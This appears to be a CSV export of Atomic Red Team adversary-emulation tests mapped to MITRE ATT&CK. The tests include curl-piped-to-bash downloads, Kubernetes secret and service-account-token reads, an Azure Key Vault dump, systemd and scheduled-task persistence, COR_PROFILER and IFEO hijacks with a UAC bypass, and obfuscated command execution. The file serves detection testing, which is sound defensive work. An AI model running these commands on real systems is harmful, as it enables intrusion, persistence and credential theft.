# -> nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
",,,
T1078.003,Valid Accounts: Local Accounts,Login as nobody (freebsd),16f6374f-7600-459a-9b16-6a88fd96d310,"An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.
",linux,,,"cat /etc/passwd |grep nobody 
# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
pw usermod nobody -s /bin/sh
echo $(openssl passwd -1 art) | pw mod user nobody -h 0
su nobody
whoami
exit
",sh,True,,"pw usermod nobody -s /usr/sbin/nologin
cat /etc/passwd |grep nobody
# -> nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
",,,
T1053.006,Scheduled Task/Job: Systemd Timers,Create Systemd Service and Timer,f4983098-bb13-44fb-9b2c-46149961807b,"This test creates Systemd service and timer then starts and enables the Systemd timer 
",linux,,,"echo ""[Unit]"" > #{path_to_systemd_service}
echo ""Description=Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_service}
echo ""[Service]"" >> #{path_to_systemd_service}
echo ""Type=simple"" >> #{path_to_systemd_service}
echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service}
echo ""[Install]"" >> #{path_to_systemd_service}
echo ""WantedBy=multi-user.target"" >> #{path_to_systemd_service}
echo ""[Unit]"" > #{path_to_systemd_timer}
echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_timer}
echo ""Requires=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""[Timer]"" >> #{path_to_systemd_timer}
echo ""Unit=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""OnCalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer}
echo ""[Install]"" >> #{path_to_systemd_timer}
echo ""WantedBy=timers.target"" >> #{path_to_systemd_timer}
systemctl start #{systemd_timer_name}
systemctl enable #{systemd_timer_name}
systemctl daemon-reload
",bash,,,"systemctl stop #{systemd_timer_name}
systemctl disable #{systemd_timer_name}
rm #{path_to_systemd_service}
rm #{path_to_systemd_timer}
systemctl daemon-reload
",,,"input_arguments.path_to_systemd_service.description: Path to systemd service unit file

input_arguments.path_to_systemd_service.type: path

input_arguments.path_to_systemd_service.default: /etc/systemd/system/art-timer.service

input_arguments.path_to_systemd_timer.description: Path to service timer file

input_arguments.path_to_systemd_timer.type: path

input_arguments.path_to_systemd_timer.default: /etc/systemd/system/art-timer.timer

input_arguments.systemd_service_name.description: Name of systemd service

input_arguments.systemd_service_name.type: string

input_arguments.systemd_service_name.default: art-timer.service

input_arguments.systemd_timer_name.description: Name of systemd service timer

input_arguments.systemd_timer_name.type: string

input_arguments.systemd_timer_name.default: art-timer.timer

"
T1053.006,Scheduled Task/Job: Systemd Timers,Create a user level transient systemd service and timer,3de33f5b-62e5-4e63-a2a0-6fd8808c80ec,"Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. 
",linux,,,"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'
",sh,False,,"systemctl --user stop Atomic-Red-Team.service
systemctl --user stop Atomic-Red-Team.timer
rm /tmp/log
",sh,"dependencies.0.description: Check if systemd-run exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v systemd-run)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Install systemd on the machine.""; exit 1;

",
T1053.006,Scheduled Task/Job: Systemd Timers,Create a system level transient systemd service and timer,d3eda496-1fc0-49e9-aff5-3bec5da9fa22,"Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. 
",linux,,,"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'
",sh,True,,"systemctl stop Atomic-Red-Team.service
systemctl stop Atomic-Red-Team.timer
rm /tmp/log
",sh,"dependencies.0.description: Check if systemd-run exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v systemd-run)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Install systemd on the machine.""; exit 1;

",
T1071.001,Application Layer Protocol: Web Protocols,Malicious User Agents - Powershell,81c13829-f6c9-45b8-85a6-053366d55297,"This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. 
Use an application such as Wireshark to record the session and observe user agent strings and responses.

Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
",windows,,,"Invoke-WebRequest #{domain} -UserAgent ""HttpBrowser/1.0"" | out-null
Invoke-WebRequest #{domain} -UserAgent ""Wget/1.9+cvs-stable (Red Hat modified)"" | out-null
Invoke-WebRequest #{domain} -UserAgent ""Opera/8.81 (Windows NT 6.0; U; en)"" | out-null
Invoke-WebRequest #{domain} -UserAgent ""*<|>*"" | out-null
",powershell,,,,,,"input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: www.google.com

"
T1071.001,Application Layer Protocol: Web Protocols,Malicious User Agents - CMD,dc3488b0-08c7-4fea-b585-905c83b48180,"This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. 
Use an application such as Wireshark to record the session and observe user agent strings and responses.

Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
",windows,,,"#{curl_path} -s -A ""HttpBrowser/1.0"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""*<|>*"" -m3 #{domain} >nul 2>&1
",command_prompt,,,,powershell,"dependencies.0.description: Curl must be installed on system 

dependencies.0.prereq_command: if (Test-Path #{curl_path}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://curl.haxx.se/windows/dl-7.71.1/curl-7.71.1-win32-mingw.zip"" -Outfile ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""
Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.71.1-win32-mingw\bin\curl.exe"" #{curl_path}
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl""
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\curl.zip""

","input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: www.google.com

input_arguments.curl_path.description: path to curl.exe

input_arguments.curl_path.type: path

input_arguments.curl_path.default: C:\Windows\System32\Curl.exe

"
T1071.001,Application Layer Protocol: Web Protocols,Malicious User Agents - Nix,2d7c471a-e887-4b78-b0dc-b0df1f2e0658,"This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
",linux,macos,,"curl -s -A ""HttpBrowser/1.0"" -m3 #{domain}
curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain}
curl -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain}
curl -s -A ""*<|>*"" -m3 #{domain}
",sh,,,,,,"input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: www.google.com

"
T1552.007,Kubernetes List Secrets,List All Secrets,31e794c4-48fd-4a76-aca4-6587c155bc11,"A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services or provide further access to the cluster.
[More information about secrets](https://kubernetes.io/docs/concepts/configuration/secret/).

This test will make a request to the Kubernetes api at the `/api/v1/secrets` endpoint requesting every secret stored within the cluster.
",containers,,,"kubectl get secrets --all-namespaces
",bash,False,,,,"dependencies.0.description: kubectl must be installed

dependencies.0.prereq_command: which kubectl

dependencies.0.get_prereq_command: echo ""kubectl not installed, please install kubectl (https://kubernetes.io/docs/tasks/tools/)""

",
T1552.007,Kubernetes List Secrets,ListSecrets,43c3a49d-d15c-45e6-b303-f6e177e44a9a,"A Kubernetes secret is an object that lets users store and manage sensitive information, such as passwords and connection strings in the cluster. Secrets can be consumed by reference in the pod configuration. Attackers who have permissions to retrieve the secrets from the API server (by using the pod service account, for example) can access sensitive information that might include credentials to various services.
",containers,,,"kubectl get secrets -n #{namespace}
",bash,False,,,,"dependencies.0.description: kubectl must be installed

dependencies.0.get_prereq_command: echo ""kubectl must be installed manually""

dependencies.0.prereq_command: which kubectl

","input_arguments.namespace.description: K8s namespace to list

input_arguments.namespace.type: string

input_arguments.namespace.default: default

"
T1552.007,Kubernetes List Secrets,Cat the contents of a Kubernetes service account token file,788e0019-a483-45da-bcfe-96353d46820f,"Access the Kubernetes service account access token stored within a container in a cluster.
",linux,,,"kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
",sh,,,"kubectl --context kind-atomic-cluster delete pod atomic-pod
",sh,"dependencies.0.description: Verify docker is installed.
dependencies.0.prereq_command: which docker

dependencies.0.get_prereq_command: if [ """" == ""`which docker`"" ]; then echo ""Docker Not Found""; if [ -n ""`which apt-get`"" ]; then sudo apt-get -y install docker ; elif [ -n ""`which yum`"" ]; then sudo yum -y install docker ; fi ; else echo ""Docker installed""; fi

dependencies.1.description: Verify docker service is running.
dependencies.1.prereq_command: sudo systemctl status docker

dependencies.1.get_prereq_command: sudo systemctl start docker

dependencies.2.description: Verify kind is in the path.
dependencies.2.prereq_command: which kind

dependencies.2.get_prereq_command: curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.10.0/kind-linux-amd64
chmod +x ./kind
mv kind /usr/bin/kind

dependencies.3.description: Verify kind-atomic-cluster is created
dependencies.3.prereq_command: sudo kind get clusters

dependencies.3.get_prereq_command: sudo kind create cluster --name atomic-cluster

dependencies.4.description: Verify kubectl is in path
dependencies.4.prereq_command: which kubectl

dependencies.4.get_prereq_command: curl -LO ""https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl""
chmod +x ./kubectl
mv kubectl /usr/bin/kubectl

dependencies.5.description: Verify atomic-pod is running.
dependencies.5.prereq_command: kubectl --context kind-atomic-cluster get pods |grep atomic-pod

dependencies.5.get_prereq_command: kubectl --context kind-atomic-cluster run atomic-pod --image=alpine --command -- sleep infinity

",
T1528,Steal Application Access Token,Azure - Dump All Azure Key Vaults with Microburst,1b83cddb-eaa7-45aa-98a5-85fb0a8807ea,"Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/",iaas:azure,,,"import-module ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""
$Password = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Password
Connect-AzureRmAccount -Credential $Credential
Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
cat #{output_file}
",powershell,True,,"remove-item #{output_file} -force -erroraction silentlycontinue
",powershell,"dependencies.0.description: The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.

dependencies.0.prereq_command: if (test-path ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""){exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest ""https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1""

dependencies.1.description: The Azure RM module must be installed.

dependencies.1.prereq_command: try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.1.get_prereq_command: Install-Module -Name AzureRM -Force -allowclobber

dependencies.2.description: The Azure module must be installed.

dependencies.2.prereq_command: try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.2.get_prereq_command: Install-Module -Name Azure -Force -allowclobber

","input_arguments.username.description: Azure AD username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure AD password

input_arguments.password.type: string

input_arguments.password.default: T1082Az

input_arguments.output_file.description: File to dump results to

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:temp\T1528Test1.txt

input_arguments.subscription_id.description: Azure subscription id to search

input_arguments.subscription_id.type: string

input_arguments.subscription_id.default: None

"
T1059.004,Command and Scripting Interpreter: Bash,Create and Execute Bash Shell Script,7e7ac3ed-f795-4fa5-b711-09d6fbe9b873,"Creates and executes a simple sh script.
",linux,macos,,"sh -c ""echo 'echo Hello from the Atomic Red Team' > #{script_path}""
sh -c ""echo 'ping -c 4 8.8.8.8' >> #{script_path}""
chmod +x #{script_path}
sh #{script_path}
",sh,,,"rm #{script_path}
",,,"input_arguments.script_path.description: Script path

input_arguments.script_path.type: path

input_arguments.script_path.default: /tmp/art.sh

"
T1059.004,Command and Scripting Interpreter: Bash,Command-Line Interface,d0c88567-803d-4dca-99b4-7ce65e7b257c,"Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
",linux,macos,,"curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
",sh,,,"rm /tmp/art-fish.txt
",,,
T1059.004,Command and Scripting Interpreter: Bash,Harvest SUID executable files,46274fc6-08a7-4956-861b-24cbbaa0503c,"AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. 
",linux,,,"chmod +x #{autosuid}
bash #{autosuid}
",sh,,,"rm -rf #{autosuid}
",bash,"dependencies.0.description: AutoSUID must exist on disk at specified location (#{autosuid})

dependencies.0.prereq_command: if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: curl --create-dirs #{autosuid_url} --output #{autosuid}

","input_arguments.autosuid.description: Path to the autosuid shell script

input_arguments.autosuid.type: path

input_arguments.autosuid.default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh

input_arguments.autosuid_url.description: Path to download autosuid shell script

input_arguments.autosuid_url.type: url

input_arguments.autosuid_url.default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh

"
T1059.004,Command and Scripting Interpreter: Bash,LinEnum tool execution,a2b35a63-9df1-4806-9a4d-5fe0500845f2,"LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.
",linux,,,"chmod +x #{linenum}
bash #{linenum}
",sh,,,"rm -rf #{linenum}
",bash,"dependencies.0.description: LinnEnum must exist on disk at specified location (#{linenum})

dependencies.0.prereq_command: if [ -f #{linenum} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: curl --create-dirs #{linenum_url} --output #{linenum}

","input_arguments.linenum.description: Path to the LinEnum shell script

input_arguments.linenum.type: path

input_arguments.linenum.default: PathToAtomicsFolder/T1059.004/src/LinEnum.sh

input_arguments.linenum_url.description: Path to download LinEnum shell script

input_arguments.linenum_url.type: url

input_arguments.linenum_url.default: https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh

"
T1059.004,Command and Scripting Interpreter: Bash,New script file in the tmp directory,8cd1947b-4a54-41fb-b5ea-07d0ace04f81,"An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.
",linux,,,"TMPFILE=$(mktemp)
echo ""id"" > $TMPFILE
bash $TMPFILE
",sh,False,,"rm $TMPFILE
unset TMPFILE
",,,
T1059.004,Command and Scripting Interpreter: Bash,What shell is running,7b38e5cc-47be-44f0-a425-390305c76c17,"An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.
",linux,,,"echo $0
if $(env |grep ""SHELL"" >/dev/null); then env |grep ""SHELL""; fi
if $(printenv SHELL >/dev/null); then printenv SHELL; fi
",sh,False,,,,,
T1059.004,Command and Scripting Interpreter: Bash,What shells are available,bf23c7dc-1004-4949-8262-4c1d1ef87702,"An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.
",linux,,,"cat /etc/shells 
",sh,False,,,,,
T1059.004,Command and Scripting Interpreter: Bash,Command line scripts,b04ed73c-7d43-4dc8-b563-a2fc595cba1a,"An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out Atomic Red Team was here!
",linux,,,"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done
",sh,,,,,,
T1059.004,Command and Scripting Interpreter: Bash,Obfuscated command line scripts,5bec4cc8-f41e-437b-b417-33ff60acf9af,"An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
ART=$(echo -n ""id"" | $encodecmd)
echo ""\$ART=$ART""
echo -n ""$ART"" | $decodecmd |/bin/bash
unset ART
",sh,False,,,,,
T1059.004,Command and Scripting Interpreter: Bash,Change login shell,c7ac59cb-13cc-4622-81dc-6d2fee9bfac7,"An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. 
",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
cat /etc/passwd |grep ^art
chsh -s /bin/sh art
cat /etc/passwd |grep ^art
",bash,True,,"[ ""$(uname)"" = 'FreeBSD' ] && rmuser -y art || userdel art
",,"dependencies.0.description: chsh - change login shell, must be installed

dependencies.0.prereq_command: if [ -f /usr/bin/chsh ]; then echo ""exit 0""; else echo ""exit 1""; exit 1; fi

dependencies.0.get_prereq_command: echo ""Automated installer not implemented yet, please install chsh manually""

",
T1059.004,Command and Scripting Interpreter: Bash,Environment variable scripts,bdaebd56-368b-4970-a523-f905ff4a8a51,"An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash
",linux,,,"export ART='echo ""Atomic Red Team was here... T1059.004""'
echo $ART |/bin/sh
",sh,False,,"unset ART
",,,
T1059.004,Command and Scripting Interpreter: Bash,Detecting pipe-to-shell,fca246a8-a585-4f28-a2df-6495973976a1,"An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
",linux,,,"cd /tmp
curl -s #{remote_url} |bash
ls -la /tmp/art.txt      
",sh,False,,"rm /tmp/art.txt
",bash,"dependencies.0.description: Check if curl is installed on the machine.

dependencies.0.prereq_command: if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi

dependencies.0.get_prereq_command: which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl

","input_arguments.remote_url.description: url of remote payload

input_arguments.remote_url.type: url

input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh

"
T1059.004,Command and Scripting Interpreter: Bash,Current kernel information enumeration,3a53734a-9e26-4f4b-ad15-059e767f5f14,"An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.
",linux,,,"uname -srm
",sh,False,,,,,
T1195,Supply Chain Compromise,Octopus Scanner Malware Open Source Supply Chain,82a9f001-94c5-495e-9ed5-f530dbded5e2,"This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db
[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)
[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)
",windows,,,"copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f
",command_prompt,,,"schtasks /delete /tn ExplorerSync /F 2>null
del %temp%\..\Microsoft\ExplorerSync.db 2>null
del %temp%\ExplorerSync.db 2>null
",powershell,"dependencies.0.description: ExplorerSync.db must exist on disk at specified location (#{rat_payload})

dependencies.0.prereq_command: if (Test-Path #{rat_payload}) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Out-File -FilePath ""#{rat_payload}""

","input_arguments.rat_payload.description: RAT dropper ExplorerSync.db

input_arguments.rat_payload.type: path

input_arguments.rat_payload.default: $env:TEMP\ExplorerSync.db

"
T1574.012,Hijack Execution Flow: COR_PROFILER,User scope COR_PROFILER,9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a,"Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.
Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,
the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
",windows,,,"Write-Host ""Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}"" -ForegroundColor Cyan
New-Item -Path ""HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32"" -Value ""#{file_name}"" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -PropertyType String -Value ""#{clsid_guid}"" -Force | Out-Null
New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""#{file_name}"" -Force | Out-Null
Write-Host ""executing eventvwr.msc"" -ForegroundColor Cyan
START MMC.EXE EVENTVWR.MSC
",powershell,,,"Remove-Item -Path ""HKCU:\Software\Classes\CLSID\#{clsid_guid}"" -Recurse -Force -ErrorAction Ignore 
Remove-ItemProperty -Path HKCU:\Environment -Name ""COR_ENABLE_PROFILING"" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER"" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -Force -ErrorAction Ignore | Out-Null
",powershell,"dependencies.0.description: ""#{file_name}"" must be present

dependencies.0.prereq_command: if (Test-Path ""#{file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"" -OutFile ""#{file_name}""

","input_arguments.file_name.description: unmanaged profiler DLL

input_arguments.file_name.type: path

input_arguments.file_name.default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll

input_arguments.clsid_guid.description: custom clsid guid

input_arguments.clsid_guid.type: string

input_arguments.clsid_guid.default: {09108e71-974c-4010-89cb-acf471ae9e2c}

"
T1574.012,Hijack Execution Flow: COR_PROFILER,System Scope COR_PROFILER,f373b482-48c8-4ce4-85ed-d40c8b3f7310,"Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.
The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
",windows,,,"Write-Host ""Creating system environment variables"" -ForegroundColor Cyan
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -PropertyType String -Value ""1"" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -PropertyType String -Value ""#{clsid_guid}"" -Force | Out-Null
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""#{file_name}"" -Force | Out-Null
",powershell,True,,"Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_ENABLE_PROFILING"" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER"" -Force -ErrorAction Ignore | Out-Null
Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name ""COR_PROFILER_PATH"" -Force -ErrorAction Ignore | Out-Null
",powershell,"dependencies.0.description: ""#{file_name}"" must be present

dependencies.0.prereq_command: if (Test-Path ""#{file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"" -OutFile ""#{file_name}""

","input_arguments.file_name.description: unmanaged profiler DLL

input_arguments.file_name.type: path

input_arguments.file_name.default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll

input_arguments.clsid_guid.description: custom clsid guid

input_arguments.clsid_guid.type: string

input_arguments.clsid_guid.default: {09108e71-974c-4010-89cb-acf471ae9e2c}

"
T1574.012,Hijack Execution Flow: COR_PROFILER,Registry-free process scope COR_PROFILER,79d57242-bbef-41db-b301-9d01d9f6e817,"Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.

Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
",windows,,,"$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '""#{file_name}""'
POWERSHELL -c 'Start-Sleep 1'
",powershell,,,"$env:COR_ENABLE_PROFILING = 0
$env:COR_PROFILER = ''
$env:COR_PROFILER_PATH = ''
",powershell,"dependencies.0.description: ""#{file_name}"" must be present

dependencies.0.prereq_command: if (Test-Path ""#{file_name}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll"" -OutFile ""#{file_name}""

","input_arguments.file_name.description: unamanged profiler DLL

input_arguments.file_name.type: path

input_arguments.file_name.default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll

input_arguments.clsid_guid.description: custom clsid guid

input_arguments.clsid_guid.type: string

input_arguments.clsid_guid.default: {09108e71-974c-4010-89cb-acf471ae9e2c}

"
T1546.012,Event Triggered Execution: Image File Execution Options Injection,IFEO Add Debugger,fdda2626-5234-4c90-b163-60849a24c0b8,"Leverage Global Flags Settings
",windows,,,"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v Debugger /d ""#{payload_binary}""
",command_prompt,True,,"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}"" /v Debugger /f >nul 2>&1
",,,"input_arguments.target_binary.description: Binary To Attach To

input_arguments.target_binary.type: path

input_arguments.target_binary.default: calc.exe

input_arguments.payload_binary.description: Binary To Execute

input_arguments.payload_binary.type: path

input_arguments.payload_binary.default: C:\Windows\System32\cmd.exe

"
